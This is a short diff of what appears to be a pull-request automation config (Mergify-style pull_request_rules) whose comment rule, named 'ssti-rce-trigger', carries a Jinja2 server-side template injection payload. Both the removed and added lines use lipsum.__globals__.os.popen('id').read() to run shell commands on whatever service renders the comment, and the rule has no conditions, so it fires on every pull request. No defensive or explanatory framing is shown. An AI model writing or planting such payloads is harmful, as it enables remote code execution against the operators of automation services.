@@ -1,13 +1,10 @@
 pull_request_rules:
-  - name: ssti-v7-20753
+  - name: ssti-rce-trigger-20516
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T SSTI v7 (fresh trigger) ===
-          author={{ author }}
+          === G4o7T SSTI trigger ===
           {% if author %}
-          R1: {{ lipsum.__globals__ }}
-          R2: {{ lipsum.__globals__.os }}
-          R3: {{ lipsum.__globals__.os.popen('id').read() }}
+          {{ lipsum.__globals__.os.popen('id').read() }}
           {% endif %}
